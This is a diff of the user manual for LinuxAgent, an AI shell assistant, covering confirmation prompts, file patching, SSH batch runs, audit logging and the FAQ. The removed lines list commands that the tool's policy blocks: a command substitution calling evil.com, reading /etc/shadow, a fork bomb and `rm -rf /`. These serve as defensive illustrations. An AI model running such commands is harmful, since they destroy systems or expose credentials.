-It executes the command, streams output as it arrives, and adds both the
-`!<command>` input and the system result to the current conversation context.
+## Common Scenarios
 
-### File creation and editing
+### Safe Inspection
 
-When you ask LinuxAgent to "create a shell script", "write a Python/Go program",
-"edit a config file", or "add a feature to this existing file", it uses the file
-patch workflow instead of asking the model to overwrite files through shell
-redirection.
-
-1. The planner can first inspect real context with read-only tools:
-   `get_system_info`, `list_dir`, `read_file(path, offset, limit)`,
-   `search_files(pattern, root)`, and `search_logs(pattern, log_file)`. Search
-   patterns are literal text, not regular expressions.
-2. Every LLM tool carries sandbox metadata with explicit permissions:
-   `read_files`, `write_files`, `execute_commands`, `system_inspect`,
-   `network_access`, and `hitl` mode.
-3. The direct `execute_command` tool is excluded from the LLM catalog by default.
-   Command planning and execution should use the main HITL graph. If
-   `sandbox.tools.enable_execute_command=true` is set, the tool still refuses
-   CONFIRM and BLOCK commands and only runs commands classified SAFE by policy.
-4. Tool calls are bounded by `sandbox.tools`: per-call timeout, per-call output
-   limit, cumulative per-request output limit, and maximum tool-calling rounds.
-   Tool exceptions, timeouts, truncation, denied calls, and repaired dangling
-   tool-call history are returned to the model as structured redacted tool
-   results instead of raw provider errors.
-5. Tool runtime events are runtime/telemetry events, not command audit records.
-   They include tool name, sandbox profile, permission summary, status, output
-   size, and redacted args/output preview. Full tool output is kept out of
-   telemetry attributes.
-6. The terminal shows observable tool activity such as `LinuxAgent is reading
-   /tmp/disk_info.sh`, then prints concise evidence from completed workspace
-   tool calls, such as line-numbered `read_file` snippets or `search_files`
-   matches. If the planner concludes that no file change is needed, the final
-   answer includes the cited evidence so the operator can see which file lines
-   or search results supported the judgment. Tool failures are surfaced clearly.
-7. The model must return a structured `FilePatchPlan` with `request_intent`,
-   target files, unified diff, risk summary, verification commands, and optional
-   permission changes.
-8. Before writing, LinuxAgent shows a diff confirmation panel with per-file
-   `+N / -M` stats, compact code snippets, elevated-risk paths, permission
-   changes, and verification commands.
-9. Small diffs are not shown twice. Large diffs are paged, and extra review is
-   requested only when hidden pages exist.
-10. Multi-file patches can be accepted per file, so the operator can apply only
-   the files they approve.
-
-After approval, LinuxAgent applies the patch transactionally. It validates
-targets before reading content, rejects symlink path components, hardlinks,
-directories, device files, FIFOs, sockets, oversized targets, and non-UTF-8
-text, writes through temporary files and atomic replace, and rolls back backed-up
-files and permission bits if any later step fails. The audit record includes the
-changed files, permission changes, backup path hashes, rollback outcome, and
-sandbox root.
-
-By default, patch reads and writes are limited to the current workspace and
-`/tmp` through `file_patch.allow_roots`. Paths such as `/etc`, `/root/.ssh`, and
-`/home/*/.ssh` are elevated risk. For "create" requests, if the intended target
-already exists, the planner should choose a new filename, explain that no change
-is needed, or ask for an explicit conflict confirmation; if the existing file
-already implements the requested behavior, it should avoid unrelated rewrites.
-
-### Scenario 1: safe command (SAFE path)
-
-```
-linuxagent ❯ list files in the current directory
-
-[LLM proposes] ls -la
-
-╭──── Human confirmation required ────╮
-│ Command  ls -la                     │
-│ Safety   CONFIRM                    │
-│ Rule     LLM_FIRST_RUN              │
-│ Source   llm                        │
-│ Sandbox  profile=system_inspect     │
-│          runner=noop runtime=no_isolation enforced=no │
-│ Network  inherit                    │
-╰──────────────────────────────────────╯
-Allow this operation?
-❯ 1. Accept / Yes
-  2. Accept, don't ask again in this conversation/resume / Yes, don't ask again
-  3. Do not accept / No
-
-Fallback prompts also accept visible `[y]`, `[a]`, and `[n]` shortcut keys for
-the same choices. During multi-step turns, the transient status line keeps the
-active task plan visible while later command activity is reported.
-
-[output]
-total 52
-drwxr-xr-x  12 user user 4096 ...
-...
-
-[analysis]
-Twelve subdirectories and a few files, permissions 755/644, owned by user.
+```text
+linuxagent > list files in the current directory
+LLM proposes: ls -la
+Safety: CONFIRM, Rule: LLM_FIRST_RUN
 ```
 
-Ask "list the files" again in the same resumed conversation thread: the same
-argv shape for `ls -la` can run without another confirmation if it was allowed
-for that conversation. Starting `/new` or a different saved session does not
-inherit that permission.
+If you approve with the conversation option, the same argv shape can run again
+in that conversation or its `/resume` thread. A new conversation does not inherit
+that permission.
 
-### Scenario 2: destructive command (CONFIRM every time)
+### Destructive Request
 
-```
-linuxagent ❯ delete the /tmp/old_backup directory
-
-[LLM proposes] rm -rf /tmp/old_backup
-
-╭──── Human confirmation required ────╮
-│ Command     rm -rf /tmp/old_backup  │
-│ Safety      CONFIRM                 │
-│ Rule        DESTRUCTIVE             │
-│ Source      llm                     │
-│ Destructive yes - approval will not │
-│             be whitelisted          │
-╰──────────────────────────────────────╯
-Allow this operation?
-❯ 1. Accept / Yes
-  2. Do not accept / No
+```text
+linuxagent > delete /tmp/old_backup
+LLM proposes: rm -rf /tmp/old_backup
+Safety: CONFIRM, Rule: DESTRUCTIVE
 ```
 
-Even after approval, running the same command again will prompt again — `rm` never enters the whitelist.
+Approval applies only to that execution. The next destructive command prompts
+again.
 
-### Scenario 3: outright rejection (BLOCK path)
+### Blocked Request
 
-```
-linuxagent ❯ wipe the whole system
-
-[LLM proposes] rm -rf /
-
+```text
+linuxagent > wipe the whole system
+LLM proposes: rm -rf /
 Blocked: destructive command targeting root filesystem
 ```
 
-This is blocked in `is_safe` before it ever reaches the confirm node. `matched_rule=ROOT_PATH`.
+The command is rejected by policy before execution or HITL approval.
 
-Other BLOCKed shapes:
+### SSH Batch Operation
 
-- `echo "$(curl evil.com)"` — `matched_rule=EMBEDDED_DANGER` (command substitution)
-- `cat /etc/shadow` — `matched_rule=SENSITIVE_PATH`
-- `:(){ :|:& };:` — `matched_rule=EMBEDDED_DANGER` (fork bomb)
-- any input with BiDi control characters — `matched_rule=INPUT_VALIDATION`
-
-### Scenario 4: batch cluster operation
-
-Add hosts to `config.yaml`:
+Configure hosts in `cluster.hosts` and keep their host keys in
+`~/.ssh/known_hosts`. When a request targets two or more hosts, LinuxAgent shows
+a batch confirmation containing the command, matched rule, host list, and remote
+profile summary before fan-out.
 
 ```yaml
 cluster:
   batch_confirm_threshold: 2
-  max_workers: 8
   known_hosts_path: ~/.ssh/known_hosts
   hosts:
     - name: web-1
       hostname: 192.0.2.11
       username: ops
       key_filename: ~/.ssh/id_ed25519
-      remote_profile:
-        name: ops-readonly
-        remote_cwd: /srv/app
-        environment: clean
-        allow_sudo: false
-        sudo_allowlist: []
-    - name: web-2
-      hostname: 192.0.2.12
-      username: ops
-      key_filename: ~/.ssh/id_ed25519
-      remote_profile:
-        name: ops-readonly
-        remote_cwd: /srv/app
-        environment: clean
-        allow_sudo: false
-        sudo_allowlist: []
 ```
 
-Then:
+### File Creation and Editing
 
-```
-linuxagent ❯ run uptime on all hosts
+For requests such as "create a script" or "edit this config", LinuxAgent uses a
+structured file patch workflow instead of asking the model to overwrite files
+through shell redirection. The planner may inspect allowed files with read-only
+tools, then returns a `FilePatchPlan` with target files, unified diff, risk
+summary, and verification commands. The diff is shown before any write, and
+approved patches are applied transactionally. Full details are covered in
+[Operator Safety](operator-safety.md).
 
-[LLM proposes] uptime  (on: web-1, web-2)
+### Interrupt and Resume
 
-╭──── Human confirmation required ────╮
-│ Command     uptime                  │
-│ Safety      CONFIRM                 │
-│ Rule        BATCH_CONFIRM           │
-│ Batch hosts web-1, web-2            │
-│ Remote profiles web-1: profile=ops-readonly user=ops cwd=/srv/app env=clean no sudo │
-╰──────────────────────────────────────╯
-Allow this operation?
-❯ 1. Accept / Yes
-  2. Do not accept / No
+Pending confirmation nodes are saved with private permissions. Restart the CLI,
+run `/resume`, choose the saved session, and LinuxAgent reopens the pending
+approval for the same thread.
 
-[web-1] exit_code=0
-[web-1] stdout:  10:23:11 up 14 days,  3:02,  2 users,  load average: 0.12, 0.08, 0.06
-[web-2] exit_code=0
-[web-2] stdout:  10:23:12 up  8 days,  9:41,  1 user,   load average: 0.04, 0.05, 0.05
-```
+## Audit Log
 
-### Scenario 5: interrupt and resume
+HITL decisions, executions, refusals, and related metadata are appended to
+`~/.linuxagent/audit.log` as hash-chained JSONL with `0o600` permissions.
 
-Pending `confirm` nodes are mirrored to `ui.checkpoint_path` with `0o600`
-permissions. After restarting the CLI, run `/resume`, choose the saved session,
-and LinuxAgent reopens the pending confirmation for that `thread_id`.
-
-### Example prompts
-
-- `show disk usage for /var`
-- `check nginx service status`
-- `search auth logs for failed ssh logins`
-- `who is still listening on port 8080`
-- `when did systemd last boot`
-- `check disk free on all hosts`
-
----
-
-## Audit log
-
-Each HITL event is appended as one hash-chained JSON line to `~/.linuxagent/audit.log`:
-
-```json
-{"ts": "2026-04-24T10:23:10.123+08:00", "event": "confirm_begin",
- "audit_id": "a1b2c3", "command": "uptime", "safety_level": "CONFIRM",
- "matched_rule": "BATCH_CONFIRM", "command_source": "llm",
- "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
- "prev_hash": "0000...", "hash": "9f86..."}
-{"ts": "2026-04-24T10:23:14.456+08:00", "event": "confirm_decision",
- "audit_id": "a1b2c3", "decision": "yes", "latency_ms": 4333,
- "trace_id": "t1", "prev_hash": "9f86...", "hash": "3a6e..."}
-{"ts": "2026-04-24T10:23:15.890+08:00", "event": "command_executed",
- "audit_id": "a1b2c3", "command": "uptime", "exit_code": 0,
- "duration_ms": 187, "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
- "prev_hash": "3a6e...", "hash": "b4c1..."}
-```
-
-Verify integrity:
+Useful read-only commands:
 
 ```bash
 linuxagent audit verify
-```
-
-Inspect a redacted operational summary:
-
-```bash
 linuxagent audit summary
 linuxagent audit inspect --limit 10
 linuxagent audit inspect --show-commands
 ```
 
-`summary` and `inspect` are read-only. They report the time range, command
-decision counts, `yes` / `no` / `timeout` / `non_tty_auto_deny` totals,
-`SAFE` / `CONFIRM` / `BLOCK` totals, and hash-chain status. Recent command
-details show a command hash by default; `--show-commands` prints command text
-only after the existing redaction rules run.
+`inspect` redacts command details by default. `--show-commands` prints command
+text only after the existing redaction rules run.
 
-The local file remains the required source of truth. You can also configure a
-best-effort HTTP append-only sink for an external collector:
+## Local Memory and Language
+
+Local filesystem memory is advisory context, not a safety boundary. It cannot
+lower policy decisions, skip HITL, change sandbox enforcement, execute commands,
+or edit audit records. Disable all memory reads and writes with:
 
 ```yaml
-audit:
-  path: ~/.linuxagent/audit.log
-  sink_enabled: true
-  sink_url: https://audit-collector.example/events
-  sink_timeout_seconds: 2
-  sink_header_name: Authorization
-  sink_header_value: Bearer replace-with-collector-token
+memory:
+  enabled: false
 ```
 
-LinuxAgent writes locally first, then posts the redacted audit record and chain
-hash to the sink. Sink errors do not block local auditing; they are appended as
-`audit_sink_failure` records for review. Keep collector tokens in `config.yaml`
-only, protected by the required `0o600` file mode.
+The runtime language for LinuxAgent-owned fixed UI text can be set at the top
+level:
 
-Handy post-incident queries:
-
-```bash
-# Every approved decision
-jq 'select(.event=="confirm_decision" and .decision=="yes")' ~/.linuxagent/audit.log
-
-# Full trace for one HITL round
-jq 'select(.audit_id=="a1b2c3")' ~/.linuxagent/audit.log
-
-# Full trace across audit records
-jq 'select(.trace_id=="t1")' ~/.linuxagent/audit.log
-
-# Refused decisions
-jq 'select(.event=="confirm_decision" and .decision!="yes")' ~/.linuxagent/audit.log
+```yaml
+language: en-US  # zh-CN | en-US
 ```
 
----
+This does not translate command output, prompt templates, audit field names,
+tool names, policy rule ids, or model-generated answers.
+
+## Where to Go Next
+
+| Need | Link |
+|---|---|
+| Provider setup | [Provider Compatibility Matrix](provider-matrix.md) |
+| Operator safety model | [Operator Safety](operator-safety.md) |
+| Threat model | [Threat Model](threat-model.md) |
+| Production checklist | [Production Readiness](production-readiness.md) |
+| Red-team cases | [Red Team](red-team.md) |
+| Development workflow | [Development](development.md) |
+| Release process | [Release](release.md) |
+| v4.1 release notes | [v4.1.0](../releases/v4.1.0.md) |
+| Chinese manual | [简体中文](../zh/README.md) |
 
 ## FAQ
 
-**Q: `linuxagent check` complains `must have permissions 0600`?**
-A: R-SEC-04 requires user configs to be `0o600` and owned by the invoking user. Run `chmod 600 ~/.config/linuxagent/config.yaml`.
+**`linuxagent check` says the config must be `0600`.**
+Run `chmod 600 ~/.config/linuxagent/config.yaml` and make sure the file is owned
+by the current user.
 
-**Q: `linuxagent chat` raises `api.api_key is required`?**
-A: Set a real value for `api.api_key` in the active config. After bootstrap this is usually the file named by `LINUXAGENT_CONFIG`; use `--config ./config.yaml` or change/unset `LINUXAGENT_CONFIG` if a workspace should use its own config.
+**`api.api_key is required`.**
+Set `api.api_key` in the active config. After bootstrap this is usually the file
+pointed to by `LINUXAGENT_CONFIG`; use `--config ./config.yaml` when you want a
+workspace-specific config.
 
-**Q: Why was my command blocked?**
-A: Look for `matched_rule` in stderr:
-
-- `EMBEDDED_DANGER` — raw-string scan found a dangerous pattern (common with LLM payloads smuggled through echo)
-- `SENSITIVE_PATH` — touched `/etc/shadow`, `/boot`, etc.
-- `ROOT_PATH` — target is the root filesystem
-- `INPUT_VALIDATION` — length / NUL / BiDi control character
-- `PARSE_ERROR` — `shlex` refused to tokenise
-
-**Q: Can `--yes` / `--no-confirm` skip every confirmation?**
-A: Deliberately no. `--yes` only downgrades dialog-level confirmations; command-level CONFIRM / BLOCK are unaffected. Non-interactive callers hit `non_tty_auto_deny`.
-
-**Q: Can I disable the audit log?**
-A: No. `AuditConfig` exposes only `path`, with no `enabled` field.
-
-**Q: How do I SSH in a fresh environment where `known_hosts` is empty?**
-A: Pre-register host keys first, for example with `ssh-keyscan -H your-host.example.com >> ~/.ssh/known_hosts`. LinuxAgent always rejects unknown SSH host keys.
-
-**Q: Does the local sandbox protect remote SSH commands?**
-A: No. Use `cluster.hosts[].remote_profile` to document and enforce the remote cwd, clean environment, and sudo allowlist. Run SSH as a low-privilege user and keep host keys pre-registered.
-
-**Q: Can I use my own OpenAI-compatible gateway?**
-A: Yes. Set `api.provider: openai_compatible`, point `api.base_url` to the gateway URL, and set `api.model` to a supported model. Shortcuts `glm`, `qwen`, `kimi`, `minimax`, `gemini`, and `hunyuan` use the same OpenAI-compatible path. Local deployments can use `ollama`, `vllm`, `lmstudio`, or `local` and leave `api.api_key` empty. If the gateway rejects `max_completion_tokens`, set `api.token_parameter: max_tokens`.
-
-**Q: Can I use an Anthropic-compatible gateway?**
-A: Yes. Install the Anthropic extra and set `api.provider: anthropic_compatible`, `api.base_url`, `api.model`, and `api.api_key`. Xiaomi MiMo can use `api.provider: xiaomi_mimo`.
-
----
-
-## Development
-
-```bash
-make install   # pip install -e ".[dev]"
-make test      # pytest + 80% fail-under
-make integration  # optional integration tests
-make optional-anthropic  # optional Anthropic extra compatibility
-make lint      # ruff check
-make type      # mypy --strict
-make security  # red-line grep + bandit
-make red-team  # adversarial command-policy corpus
-make benchmark # policy/parser latency benchmark
-make sandbox   # sandbox boundary regression suite
-make harness   # YAML scenario harness
-make build     # wheel + sdist
-make verify-build  # build + wheel install + packaged data check
-make ts-check  # experimental TypeScript workspace gate
-make ts-parity # experimental TS/Python parity runner
-linuxagent audit verify
-```
-
-Details in [Development Guide](development.md). The experimental TypeScript v5
-rewrite track is documented in [TypeScript v5 Experimental Kernel](typescript-v5.md);
-it does not replace the Python v4 production runtime.
-
-The TypeScript runtime is experimental. Python v4 remains the default release runtime until parity gates pass.
-
----
-
-## Release
-
-```bash
-make harness
-make integration  # optional, when local environment permits
-make sandbox
-make verify-build
-git tag v4.1.0
-git push origin v4.1.0     # triggers release.yml
-```
-
-See [Release Guide](release.md).
-
----
-
-## Docs
-
-- [Quick Start](quickstart.md)
-- [TypeScript v5 Experimental Kernel](typescript-v5.md)
-- [Provider Compatibility Matrix](provider-matrix.md)
-- [Operator Safety Model](operator-safety.md)
-- [Development Guide](development.md)
-- [Release Guide](release.md) / [中文发布指南](../zh/release.md)
-- [Migration Guide: v3 to v4.0.0](migration-v3-to-v4.md)
-- [Threat Model](threat-model.md)
-- [Production Readiness](production-readiness.md)
-- [Roadmap](../../ROADMAP.md)
-- [Release Notes](../releases/v4.1.0.md) / [中文发布说明](../zh/releases/v4.1.0.md)
-- [Changelog](../../CHANGELOG.md) / [中文更新日志](../zh/CHANGELOG.md)
-- [Security Policy](../../SECURITY.md) / [安全政策](../zh/SECURITY.md)
-- [Contributing](../../CONTRIBUTING.md) / [贡献指南](../zh/CONTRIBUTING.md)
-- [Code of Conduct](../../CODE_OF_CONDUCT.md) / [行为准则](../zh/CODE_OF_CONDUCT.md)
-
----
+**Can `--yes` skip all confirmations?**
+No. Command-level `CONFIRM` and `BLOCK` decisions are safety boundaries. A
+non-interactive context auto-denies confirmations instead of approving them.
 
 ## License
 
-MIT
+This project is licensed under the MIT License.
